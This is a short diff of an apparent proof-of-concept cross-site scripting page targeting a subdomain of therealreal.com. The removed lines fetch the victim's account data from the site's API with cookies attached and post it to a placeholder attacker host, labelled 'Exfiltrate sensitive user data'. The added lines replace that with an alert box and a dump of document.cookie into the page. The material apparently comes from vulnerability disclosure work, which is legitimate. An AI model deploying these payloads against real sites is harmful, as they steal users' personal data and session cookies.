@@ -1,23 +1,7 @@
-<html>
-<body>
 <script>
-// Because this is on a subdomain of therealreal.com, 
-// we may have access to shared cookies or localStorage 
-// depending on the domain configuration.
-// Even if cookies are scoped to 'www', this proves the 
-// vulnerability allows code execution on the trusted domain.
-
-fetch('https://www.therealreal.com/api/v1/user/me', {
-    credentials: 'include' // Sends cookies
-})
-.then(response => response.json())
-.then(data => {
-    // Exfiltrate sensitive user data
-    fetch('https://attacker-server.com/log', {
-        method: 'POST',
-        body: JSON.stringify(data)
-    });
-});
+  // This proves JavaScript execution
+  alert("XSS via Deep Link");
+  
+  // This proves you can access the Document (cookie theft potential)
+  document.body.innerHTML = "<h1>Injecting HTML</h1><pre>" + document.cookie + "</pre>";
 </script>
-</body>
-</html>
